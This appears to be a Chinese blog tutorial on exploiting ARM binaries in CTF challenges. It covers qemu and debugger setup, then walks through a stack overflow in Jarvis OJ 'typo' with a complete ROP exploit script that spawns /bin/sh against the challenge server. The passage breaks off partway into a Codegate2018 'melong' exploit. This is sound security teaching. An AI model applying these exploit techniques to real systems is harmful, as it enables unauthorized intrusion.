<!doctype html>

<html lang="en">

<head>
  <title>localhost</title>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="The HTML5 Herald" />
  <meta name="author" content="M4x" />
  <meta name="generator" content="Hugo 0.44" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
  <link rel="stylesheet" type="text/css" href="https://0x01f.github.io/css/styles.css" />
</head>

<body>
  <div id="container">
    <header>
      <h1>
                <a href="https://0x01f.github.io/">localhost</a>
            </h1>

      <ul id="social-media">
        
        <li><a href="https://twitter.com/M4x88985494"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
          
        <li><a href="https://github.com/0x01f"><i class="fa fa-github fa-lg" aria-hidden="true"></i></a></li>
            
        <li><a href="mailto:I_am_M4x@protonmail.com"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
        
      </ul>
      
      <p><em>Done with development, it&rsquo;s time to pwn.</em></p>
      
    </header>

    
<nav>
    <ul>
        
        <li>
            <a class="" href="https://0x01f.github.io/post/">
                <i class="fa-li fa  fa-lg"></i><span>ls -l ./post</span>
            </a>
        </li>
        
        <li>
            <a class="" href="https://0x01f.github.io/post/link/">
                <i class="fa-li fa  fa-lg"></i><span>cat ./friends</span>
            </a>
        </li>
        
        <li>
            <a class="" href="https://0x01f.github.io/post/aboutme/">
                <i class="fa-li fa  fa-lg"></i><span>whoami</span>
            </a>
        </li>
        
    </ul>
</nav>

    <main>




<article>

    <h1>如何 pwn 掉一个 arm 的binary</h1>

    
        <aside>
    <ul>
        <li>
            <time class="post-date" datetime="2018-07-31T20:00:54&#43;08:00">Jul 31, 2018</time>
        </li>
        
        

        

        <li>Reading time 6 min</li>
    </ul>
</aside>

    

    

<p>这篇文章将以几道 CTF 题目为例讲解 pwn arm binary的一些问题</p>

<h2 id="环境搭建">环境搭建</h2>

<p>环境的搭建过程我之前写过, 这里偷个懒直接全文粘贴过来</p>

<hr />

<blockquote>
<p>原文链接<a href="http://www.cnblogs.com/WangAoBo/p/debug-arm-mips-on-linux.html">M4x@10.0.0.55</a>
本文中用于展示的binary分别来自Jarvis OJ上pwn的add，typo两道题</p>
</blockquote>

<p>写这篇教程的主要目的是因为最近想搞其他系统架构的 pwn，因此第一步就是搭建环境了，网上搜索了一波，发现很多教程都是需要树莓派，芯片等硬件，然后自己编译 gdb，后来实践的过程中发现可以很简单地使用 qemu 实现运行和调试异架构 binary，因此在这里分享一下我的方法。</p>

<h3 id="主机信息">主机信息：</h3>

<p>以一台新装的 deepin 虚拟机(基于 debian)为例，详细信息如下：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5av617a5j30lq0bu78m.jpg" alt="" /></p>

<h3 id="预备环境安装">预备环境安装：</h3>

<ul>
<li>安装 git，gdb 和 gdb-multiarch，同时安装 binfmt 用来识别文件类型</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo apt-get update
$ sudo apt-get install git gdb gdb-multiarch
$ sudo apt-get install <span style="color:#e6db74">&#34;binfmt*&#34;</span></code></pre></div>
<ul>
<li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件）</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pwndbg/pwndbg
$ cd pwndbg
$ ./setup.sh</code></pre></div>
<p>装好之后如图：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5c1vzla8j30nb04t75m.jpg" alt="" /></p>

<ul>
<li>安装pwntools，不必要，但绝对是写exp的神器</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  $ sudo pip install pwntools</code></pre></div>
<h3 id="安装qemu">安装qemu：</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo apt-get install qemu-user</code></pre></div>
<p>通过 qemu 模拟 arm/mips 环境，进而进行调试</p>

<h3 id="安装共享库">安装共享库：</h3>

<p>此时已经可以运行静态链接的 arm/mips binary 了，如下图：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5crjvp5dj31400p0ngj.jpg" alt="" /></p>

<p>但还不能运行动态链接的 binary，如下图：</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5csjo38rj313o05i779.jpg" alt="" /></p>

<p>这就需要我们安装对应架构的共享库，可以通过如下命令搜索：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ apt-cache search <span style="color:#e6db74">&#34;libc6&#34;</span> | grep ARCH</code></pre></div>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5cudid7gj30xy0h7trd.jpg" alt="" /></p>

<p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可</p>

<h3 id="运行">运行：</h3>

<p>静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p>

<p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，如下图32位的动态链接 mips binary</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d1guaxvj313m03bq55.jpg" alt="" /></p>

<p>使用 -L 指定共享库：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add</code></pre></div>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5d3xxmfqj30z50c4ahc.jpg" alt="" /></p>

<h3 id="调试">调试：</h3>

<p>可以使用 qemu 的 -g 指定端口</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ qemu-mipsel -g <span style="color:#ae81ff">1234</span> -L /usr/mipsel-linux-gnu/ ./add</code></pre></div>
<p>然后使用gdb-multiarch进行调试，先指定架构，然后使用remote功能</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; set architecture mips <span style="color:#f92672">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span style="color:#f92672">)</span>
pwndbg&gt; target remote localhost:1234</code></pre></div>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dbufgrjj31400p013o.jpg" alt="" /></p>

<p>这样我们就能进行调试了</p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt="" /></p>

<h3 id="效果图">效果图：</h3>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5de5c26aj31400p046h.jpg" alt="" /></p>

<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq5dg64kb8j31400p0tgd.jpg" alt="" /></p>

<h3 id="more">more：</h3>

<p>同样，如果想要运行或者调试其他架构的 binary，只需安装其他架构的 qemu 和共享库即可</p>

<h3 id="reference">reference：</h3>

<p><a href="https://docs.pwntools.com/en/stable/qemu.html">https://docs.pwntools.com/en/stable/qemu.html</a></p>

<p><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></p>

<hr />

<h2 id="运行和调试">运行和调试</h2>

<p>安装好 qemu 之后, 就可以在本地运行和调试 binary 了, 我写了一个模板:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;your_binary&#34;</span>

<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;r&#34;</span>:
    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;remote_addr&#34;</span>, remote_port)
<span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;l&#34;</span>:
    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;/usr/arm-linux-gnueabi&#34;</span>, <span style="color:#e6db74">&#34;your_binary&#34;</span>])
<span style="color:#66d9ef">else</span>:
    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;1234&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;/usr/arm-linux-gnueabi&#34;</span>, <span style="color:#e6db74">&#34;your_binary&#34;</span>])

elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;your_binary&#34;</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span>)
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span></code></pre></div>
<p>说明一下:</p>

<ul>
<li>根据 pwntools 的 <a href="http://docs.pwntools.com/en/stable/context.html?highlight=context.binary#pwnlib-context-setting-runtime-variables">官方文档</a>, 使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数了</li>
</ul>

<blockquote>
<p>The recommended method is to use context.binary to automagically set all of the appropriate values.</p>
</blockquote>

<ul>
<li>python exp.py r 打远程</li>
<li>python exp.py l 本地测试</li>

<li><p>python exp.py d/a/b/&hellip; 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</p></li>

<li><p>这里只写了使用 arm-linux-gnueabi 的情况, 使用 arm-linux-gnueabihf 的话更改参数即可, 关于二者的区别可以参考这篇 <a href="https://www.cnblogs.com/xiaotlili/p/3306100.html">文章</a></p></li>
</ul>

<h2 id="arm-下的函数调用约定">arm 下的函数调用约定</h2>

<p>arm 的参数 1 ~ 4 分别保存到 r0 ~ r3 寄存器中, 剩下的参数从右向左依次入栈, 被调用者实现栈平衡, 返回值存放在 r0 中</p>

<p>一图胜千言:</p>

<p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="" /></p>

<p>by the way, arm 的 pc 指针相当于 eip/rip, b/bl 等指令实现了跳转</p>

<p>接下来以几道题目为例进行分析</p>

<h2 id="jarvis-oj-typo">Jarvis oj - typo</h2>

<p><a href="https://github.com/0x01f/pwn_repo/tree/master/jarvisOJ_typo">题目和脚本链接</a></p>

<h3 id="静态分析">静态分析</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span style="color:#f92672">[</span>master●<span style="color:#f92672">]</span> check typo
typo: ELF <span style="color:#ae81ff">32</span>-bit LSB executable, ARM, EABI5 version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, statically linked, <span style="color:#66d9ef">for</span> GNU/Linux <span style="color:#ae81ff">2</span>.6.32, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/m4x/pwn_repo/jarvisOJ_typo/typo&#39;</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE</code></pre></div>
<p>32 位 arm 静态链接的程序, strip 过了, 并且没有开栈溢出保护, 因为是静态链接, 所以 binary 中一定会有 system 函数 和 /bin/sh 字符串, 如果能找到溢出点, 很容易就能用 rop 来解决了</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span style="color:#f92672">[</span>master●●<span style="color:#f92672">]</span> ./typo
Let<span style="color:#e6db74">&#39;s Do Some Typing Exercise~
</span><span style="color:#e6db74">Press Enter to get start;
</span><span style="color:#e6db74">Input ~ if you want to quit
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">------Begin------
</span><span style="color:#e6db74">inquiry
</span><span style="color:#e6db74">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span style="color:#e6db74">E.r.r.o.r.
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">odour
</span><span style="color:#e6db74">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
</span><span style="color:#e6db74">qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion `!have_tb_lock&#39;</span> failed.
qemu-arm: /build/qemu-c9y6mQ/qemu-2.8+dfsg/translate-all.c:175: tb_lock: Assertion <span style="color:#e6db74">`</span>!have_tb_lock<span style="color:#960050;background-color:#1e0010">&#39;</span> failed.
<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">]</span>    <span style="color:#ae81ff">3426</span> segmentation fault  ./typo</code></pre></div>
<h3 id="思路">思路</h3>

<p>运行一下发现是一个打字游戏, 很容易就找到了溢出点, 利用 rop chain 构造 system(&ldquo;/bin/sh&rdquo;) 即可, /bin/sh 的地址比较好找, 只要找到 system 的地址, 这个题目就很容易解决了</p>

<p>binary 去除了符号表信息, 并不是太容易看出来函数功能, 幸运的是通过在 IDA 中查看 /bin/sh 的交叉引用, 我们能找到调用 system 的函数(sub_10BA8 函数中出现了 /bin/sh, 读过 system 源码的同学可以发现该函数与 system 的流程类似, 于是大胆猜测 sun_10BA8 即为 system, 后来事实证明确实是)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_110B4</span>(<span style="color:#66d9ef">int</span> a1)
{
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>result; <span style="color:#75715e">// r0
</span><span style="color:#75715e"></span>
  <span style="color:#66d9ef">if</span> ( a1 )
    result <span style="color:#f92672">=</span> sub_10BA8(a1);                     <span style="color:#75715e">// system(a1)
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">else</span>
    result <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(sub_10BA8((<span style="color:#66d9ef">int</span>)<span style="color:#e6db74">&#34;exit 0&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
  <span style="color:#66d9ef">return</span> result;
}</code></pre></div>
<hr />

<p>后来发现，使用 <code>rizzo</code> 可以恢复出 system 的符号表，这样寻找 system 的地址就很容易了</p>

<h3 id="rop">ROP</h3>

<p>这样我们只需要找一个能控制 r0 的 gadget 寄存器就行了</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jarvisOJ_typo <span style="color:#f92672">[</span>master●●<span style="color:#f92672">]</span> ROPgadget --binary ./typo --only <span style="color:#e6db74">&#34;pop|ret&#34;</span> | grep r0
0x00020904 : pop <span style="color:#f92672">{</span>r0, r4, pc<span style="color:#f92672">}</span>
jarvisOJ_typo <span style="color:#f92672">[</span>master●●<span style="color:#f92672">]</span> ROPgadget --binary ./typo --string /bin/sh          
Strings information
<span style="color:#f92672">============================================================</span>
0x0006c384 : /bin/sh</code></pre></div>
<p>于是可以构造如下的栈结构</p>

<pre><code>+------------+
|            |
|   padding  |
|            |
|            |
+------------+
| gadget_addr| &lt;- 0x20904
+------------+
| binsh_addr | &lt;- 0x6c384
+------------+
| junk_data  |
+------------+
| system_addr| &lt;- 0x100B4
+------------+
</code></pre>

<p>这样在程序返回时, 经过 rop 就会实现 r0 -&gt; &ldquo;/bin/sh&rdquo;, r4 -&gt; junk_data, pc = system_addr 的效果, 进而执行 system(&ldquo;/bin/sh&rdquo;) 来 get shell</p>

<p>此时还有一个问题, 不知道 padding 的长度, 可以通过 pwntools 的 cyclic/cyclic -l 来找长度</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; cyclic <span style="color:#ae81ff">200</span>
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg&gt; c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? <span style="color:#f92672">()</span>
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────<span style="color:#f92672">[</span> REGISTERS <span style="color:#f92672">]</span>──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">)</span>
 R2   0x7e
 R3   0x0
 R4   0x62616162 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;baab&#39;</span><span style="color:#f92672">)</span>
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   <span style="color:#f92672">{</span>r3, r4, r5, r6, r7, r8, sb, lr<span style="color:#f92672">}</span>
 R10  0xa68c ◂— push   <span style="color:#f92672">{</span>r3, r4, r5, lr<span style="color:#f92672">}</span>
 R11  0x62616163 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;caab&#39;</span><span style="color:#f92672">)</span>
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;eaab&#39;</span><span style="color:#f92672">)</span>
 PC   0x62616164 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;daab&#39;</span><span style="color:#f92672">)</span>
───────────────────────────────────────────────────<span style="color:#f92672">[</span> DISASM <span style="color:#f92672">]</span>────────────────────────────────────────────────────
Invalid address 0x62616164










────────────────────────────────────────────────────<span style="color:#f92672">[</span> STACK <span style="color:#f92672">]</span>────────────────────────────────────────────────────
<span style="color:#ae81ff">00</span>:0000│ sp  0xfffef098 ◂— 0x62616165 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;eaab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">01</span>:0004│     0xfffef09c ◂— 0x62616166 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;faab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">02</span>:0008│     0xfffef0a0 ◂— 0x62616167 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;gaab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">03</span>:000c│     0xfffef0a4 ◂— 0x62616168 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;haab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">04</span>:0010│     0xfffef0a8 ◂— 0x62616169 <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;iaab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">05</span>:0014│     0xfffef0ac ◂— 0x6261616a <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;jaab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">06</span>:0018│     0xfffef0b0 ◂— 0x6261616b <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;kaab&#39;</span><span style="color:#f92672">)</span>
<span style="color:#ae81ff">07</span>:001c│     0xfffef0b4 ◂— 0x6261616c <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;laab&#39;</span><span style="color:#f92672">)</span>
Program received signal SIGSEGV
pwndbg&gt; cyclic -l 0x62616164
<span style="color:#ae81ff">112</span></code></pre></div>
<hr />

<p>或者可以直接爆破 padding 长度</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> pdb
<span style="color:#75715e">#  context.log_level = &#34;debug&#34;</span>

<span style="color:#75715e">#  for i in range(100, 150)[::-1]:</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">113</span>):
    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;l&#34;</span>:
        io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./typo&#34;</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;d&#34;</span>:
        io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;1234&#34;</span>, <span style="color:#e6db74">&#34;./typo&#34;</span>])
    <span style="color:#66d9ef">else</span>:
        io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn2.jarvisoj.com&#34;</span>, <span style="color:#ae81ff">9888</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>)
    
    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;quit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
    io<span style="color:#f92672">.</span>recvline()
    
    <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
</span><span style="color:#e6db74">    Strings information
</span><span style="color:#e6db74">    ============================================================
</span><span style="color:#e6db74">    0x0006c384 : /bin/sh
</span><span style="color:#e6db74">    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only &#34;pop|ret&#34; | grep r0
</span><span style="color:#e6db74">    0x00020904 : pop {r0, r4, pc}
</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
    
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x20904</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x6c384</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x110B4</span>)
    success(i)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)

    <span style="color:#75715e">#  pause()</span>
    <span style="color:#66d9ef">try</span>:
        <span style="color:#75715e">#  pdb.set_trace()</span>
        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;echo aaaa&#34;</span>)
        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;aaaa&#34;</span>, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>)
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
        io<span style="color:#f92672">.</span>close()
        <span style="color:#66d9ef">continue</span>
    <span style="color:#66d9ef">else</span>:
        io<span style="color:#f92672">.</span>interactive()</code></pre></div>
<h2 id="codegate2018-melong">Codegate2018 - melong</h2>

<p><a href="https://github.com/0x01f/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>

<h3 id="静态分析-1">静态分析</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">melong: ELF <span style="color:#ae81ff">32</span>-bit LSB executable, ARM, EABI5 version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span style="color:#66d9ef">for</span> GNU/Linux <span style="color:#ae81ff">3</span>.2.0, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>2c55e75a072020303e7c802d32a5b82432f329e9, not stripped
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/m4x/pwn_repo/Codegate2018_Melong/melong&#39;</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE</code></pre></div>
<h3 id="思路分析">思路分析</h3>

<p>程序逻辑很简单, 就不写分析过程了, 漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(&ldquo;/bin/sh&rdquo;) 即可</p>

<p><strong>比赛时这道题目并没有给 libc 文件, 为了简化演示过程, 我直接用了我本地的 libc</strong></p>

<h3 id="exp">exp</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">import</span> sys
context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./melong&#34;</span>

<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;r&#34;</span>:
    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">9999</span>)
<span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;l&#34;</span>:
    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;/usr/arm-linux-gnueabi&#34;</span>, <span style="color:#e6db74">&#34;./melong&#34;</span>])
<span style="color:#66d9ef">else</span>:
    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;qemu-arm&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;1234&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;/usr/arm-linux-gnueabi&#34;</span>, <span style="color:#e6db74">&#34;./melong&#34;</span>])

elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./melong&#34;</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/usr/arm-linux-gnueabi/lib/libc.so.6&#34;</span>)
context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check</span>(height, weight):
